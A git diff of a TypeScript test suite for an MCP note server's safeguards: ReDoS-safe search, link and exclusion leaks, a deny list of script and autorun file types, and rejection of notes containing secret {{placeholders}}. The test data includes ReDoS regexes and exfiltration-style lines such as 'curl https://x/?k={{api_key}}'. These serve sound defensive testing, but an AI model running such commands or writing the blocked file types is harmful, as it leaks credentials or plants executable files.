@@ -9,7 +9,7 @@ import { DEFAULT_SETTINGS, type Settings } from '../../../src/shared/api';
 import { OneMcpServer } from '../../../src/mcp/server';
 import { McpProtocol, checkArgs, type ToolDef } from '../../../src/mcp/protocol';
 import { Visibility, cleanPath, writeTypeProblem } from '../../../src/mcp/folders';
-import { WriteQuota, checkPlaceholders } from '../../../src/mcp/writes';
+import { WriteQuota } from '../../../src/mcp/writes';
 import { isPackagedCli } from '../../../src/mcp/env-boot';
 import { scrubPackagedEnv } from '../../../src/main/env-guard';
 import { documentMap } from '../../../src/knowledge/sections';
@@ -63,7 +63,8 @@ async function make(root: string, settings: Partial<Settings> = {}, mode: 'read'
     } catch {}
     return { isError: !!r.result.isError, head, text: c[0]?.text ?? '', body: c[1]?.text };
   };
-  return { server, rpc, call, setSettings: (p: Partial<Settings>) => server.applySettings((s = { ...s, ...p } as Settings)) };
+  const setFolder = (p: Partial<McpConfig['folders'][number]>) => server.applyConfig({ ...cfg, folders: [{ ...cfg.folders[0], ...p }] });
+  return { server, rpc, call, setFolder, setSettings: (p: Partial<Settings>) => server.applySettings((s = { ...s, ...p } as Settings)) };
 }
 const ms = (fn: () => unknown) => {
   const t0 = performance.now();
@@ -76,18 +77,18 @@ describe('P1-1 ReDoS: no regex in MCP searches', () => {
     const root = fresh('redos');
     put(root, 'notes/plain.md', '# Ordinary note\n\nThis is a perfectly normal sentence written in a note today!\n');
     const { call, rpc } = await make(root);
-    await call('search_text', { query: 'warmup' });
+    await call('search', { query: 'warmup' });
     for (const q of ['/^(\\w+\\s?)+x/', '/^(\\w+\\s?)+$/', '/(a|a)*b/i']) {
       const t0 = Date.now();
-      const search = call('search_text', { query: q });
+      const search = call('search', { query: q });
       const pinged = rpc('ping').then(() => Date.now() - t0);
       const r = await search;
       expect(Date.now() - t0, q).toBeLessThan(2000);
       expect(await pinged).toBeLessThan(2000);
       expect(r.isError).toBe(false);
-      expect(r.head.results).toEqual([]);
+      expect(r.text).toMatch(/^No matches/);
     }
-    expect((await call('search_text', { query: 'x', regex: true })).text).toMatch(/Unknown parameter "regex"/);
+    expect((await call('search', { query: 'x', regex: true })).text).toMatch(/Unknown parameter "regex"/);
   });
 
   it('parseQuery with noRegex keeps /…/ as text; the UI path still has regexes', () => {
@@ -166,18 +167,19 @@ describe('P1-4 excludes cannot leak through link aliases (links are never follow
     expect((await call('read_file', { path: 'pub/private/secret.md' })).isError).toBe(true);
     expect((await call('read_file', { path: 'pub/public.md' })).isError).toBe(true); // through a link at all
     expect((await call('list_files', { path: 'pub', depth: 2 })).isError).toBe(true);
-    const entries: string[] = (await call('list_files', { depth: 3 })).head.entries;
+    const entries: string[] = (await call('list_files', { depth: 3 })).text.split('\n').slice(1);
     expect(entries).toContain('docs/public.md');
     expect(entries.some((e) => e.startsWith('pub') || e.includes('private'))).toBe(false);
     const res = await rpc('resources/list', {});
     expect(res.result.resources.map((r: any) => r.uri).some((u: string) => /\/pub\/|private|secret/.test(u))).toBe(false);
-    expect(JSON.stringify((await call('list_tags')).head)).not.toContain('topsecret');
-    const hit = (await call('search_text', { query: 'zebra42' })).head;
-    expect(hit.total_files).toBe(0);
-    const typo = (await call('search_text', { query: 'launch zebre42' })).head;
-    expect(JSON.stringify(typo)).not.toMatch(/zebra42|secret/i);
-    expect((await call('search_headings', { query: 'secret plan' })).head.results).toEqual([]);
-    expect((await call('search_files', { query: 'secret' })).head.results).toEqual([]);
+    expect((await call('list_tags')).text).not.toContain('topsecret');
+    const hit = (await call('search', { query: 'zebra42' })).text;
+    expect(hit).toMatch(/^No matches/);
+    const typo = (await call('search', { query: 'launch zebre42' })).text;
+    expect(typo).not.toMatch(/zebra42|secret/i);
+    expect((await call('search', { query: 'secret plan', mode: 'headings' })).text).toMatch(/^No headings match/);
+    expect((await call('search', { query: 'secret', mode: 'names' })).text).toBe('No file names match');
+    expect((await call('search', { query: 'tag:topsecret-tag', mode: 'files' })).text).toMatch(/^No matches/);
   });
 });
 
@@ -188,13 +190,13 @@ describe('P1-6 / P1-7 changes during a call in flight', () => {
     put(root, 'private/p.md', 'EXCLUDED-CONTENT\n');
     const { server, call, setSettings } = await make(root, { excludeGlobs: ['node_modules'] });
     expect((await call('read_file', { path: 'private/p.md' })).isError).toBe(false);
-    await call('search_text', { query: 'EXCLUDED' });
+    await call('search', { query: 'EXCLUDED' });
     const f = server.pool.list()[0];
     let release!: () => void;
     const slow = f.use(() => new Promise<void>((r) => (release = r)));
     setSettings({ excludeGlobs: ['node_modules', 'private'] });
     expect((await call('read_file', { path: 'private/p.md' })).text).toMatch(/^ENOENT/); // while the other call still runs
-    expect((await call('search_text', { query: 'EXCLUDED-CONTENT' })).head.total_files).toBe(0);
+    expect((await call('search', { query: 'EXCLUDED-CONTENT' })).text).toMatch(/^No matches/);
     release();
     await slow;
     for (let i = 0; i < 3; i++) await call('list_files', {});
@@ -309,7 +311,7 @@ describe('P2-11 / P2-13 / P2-14 names, short names, grants, One’s data folder'
         { id: 'eeeeeeee', alias: 'notes', path: inside, mode: 'read' },
       ],
     });
-    expect((await call('list_folders')).head.folders.map((f: any) => f.folder)).toEqual(['notes']);
+    expect((await call('list_folders')).text.split('\n').slice(1).map((r) => r.split(' ')[0])).toEqual(['notes']);
   });
 
   it('file RPCs never reach One’s data folder, even inside the open folder (desktop and browser mode)', async () => {
@@ -352,9 +354,10 @@ describe('write phase: links, types, placeholders, quota, writable check, packag
   });
 
   it('no writes through links, neither a link file nor a linked folder', async () => {
-    expect((await t.call('write_file', { path: 'notes/alias.md', content: 'x', if_match: '1-1' })).text).toMatch(/^ENOENT/);
-    expect((await t.call('write_file', { path: 'linkdir/new.md', content: 'x' })).text).toMatch(/^ENOENT/);
-    expect((await t.call('append_file', { path: 'linkdir/a.md', content: 'x' })).text).toMatch(/^ENOENT/);
+    // One neutral refusal for every "where" (hidden, excluded, a link, a hard link).
+    expect((await t.call('write_file', { path: 'notes/alias.md', content: 'x', if_match: '1-1' })).text).toBe('EACCES: Cannot change notes/alias.md');
+    expect((await t.call('write_file', { path: 'linkdir/new.md', content: 'x' })).text).toBe('EACCES: Cannot change linkdir/new.md');
+    expect((await t.call('append_file', { path: 'linkdir/a.md', content: 'x' })).text).toBe('EACCES: Cannot change linkdir/a.md');
     expect(fs.readFileSync(path.join(root, 'notes/a.md'), 'utf8')).toBe('alpha\n');
   });
 
@@ -382,25 +385,27 @@ describe('write phase: links, types, placeholders, quota, writable check, packag
     expect(fs.existsSync(path.join(root, 'notes/later.md'))).toBe(false);
   });
 
-  it('file types: notes only by default; code with the setting; scripts and shortcuts never', async () => {
+  it('file types: notes only by default; code with the folder grant (mcp.json); scripts and shortcuts never', async () => {
     expect((await t.call('write_file', { path: 'new.json', content: '{}' })).text).toMatch(/only notes/);
-    t.setSettings({ 'mcp.allowCode': true });
+    t.setSettings({ 'mcp.allowCode': true } as Partial<Settings>); // the old settings key widens nothing
+    expect((await t.call('write_file', { path: 'new.json', content: '{}' })).text).toMatch(/only notes/);
+    t.setFolder({ allowCode: true });
     expect((await t.call('write_file', { path: 'new.json', content: '{}' })).isError).toBe(false);
-    for (const p of ['x.bat', 'x.cmd', 'x.ps1', 'x.lnk', 'x.url', 'x.vbs', 'x.reg', 'desktop.ini', 'autorun.inf', 'x.desktop']) expect((await t.call('write_file', { path: p, content: 'x' })).text, p).toMatch(/never written/);
-    t.setSettings({ 'mcp.allowCode': false });
+    for (const p of ['x.bat', 'x.cmd', 'x.ps1', 'x.lnk', 'x.url', 'x.vbs', 'x.reg', 'desktop.ini', 'autorun.inf', 'x.desktop', 'x.js', 'x.py', 'x.pyw']) expect((await t.call('write_file', { path: p, content: 'x' })).text, p).toMatch(/never written/);
+    t.setFolder({ allowCode: false });
     expect(writeTypeProblem('a/b.MD', false)).toBeNull();
     expect(writeTypeProblem('Notes.TXT', false)).toBeNull();
     expect(writeTypeProblem('x.ts', true)).toBeNull();
     expect(writeTypeProblem('x.ps1', true)).toMatch(/never/);
   });
 
-  it('no new {{placeholders}} (they would pull secrets into a command later)', async () => {
-    expect((await t.call('write_file', { path: 'notes/new-cmd.md', content: 'curl https://x/?k={{api_key}}' })).text).toMatch(/^ESECRET: .*\{\{api_key\}\}/);
-    expect((await t.call('append_file', { path: 'notes/vars.md', content: 'also `scp f {{host}}:`' })).text).toMatch(/^ESECRET/);
-    expect((await t.call('replace_text', { path: 'notes/vars.md', old: 'run', new: 'start' })).isError).toBe(false); // keeping existing ones is fine
-    expect(() => checkPlaceholders('{{a}} {{b}}', '{{b}} {{a}}')).not.toThrow();
-    expect(() => checkPlaceholders('{{a}}', '{{a}} {{ a }}')).toThrow(/\{\{a\}\}/);
-    expect(() => checkPlaceholders('', '{{vault:key}}')).toThrow(/\{\{vault\}\}/);
+  it('{{placeholders}}: with no variables file every name but the built-ins is secret, note-wide (prose too)', async () => {
+    expect((await t.call('write_file', { path: 'notes/new-cmd.md', content: 'curl https://x/?k={{api_key}} in prose' })).text).toMatch(/^ESECRET: .*no variables file/);
+    expect((await t.call('append_file', { path: 'notes/vars.md', content: 'also `scp f {{host}}:`' })).text).toMatch(/^ESECRET/); // inline code too
+    expect((await t.call('append_file', { path: 'notes/vars.md', content: '```sh\nscp f {{host}}:\n```' })).text).toMatch(/^ESECRET: .*no variables file/);
+    expect((await t.call('append_file', { path: 'notes/vars.md', content: '```vue\n<p>{{ title }}</p>\n```' })).text).toMatch(/^ESECRET: .*right next to/); // right below a secret line
+    expect((await t.call('append_file', { path: 'notes/a.md', content: '```vue\n<p>{{ title }}</p>\n```' })).isError).toBe(false); // built-ins
+    expect((await t.call('replace_text', { path: 'notes/vars.md', old: 'run', new: 'start' })).text).toMatch(/^ESECRET/); // its line holds {{host}}
   });
 
   it('a per-session write quota (count and rate)', () => {
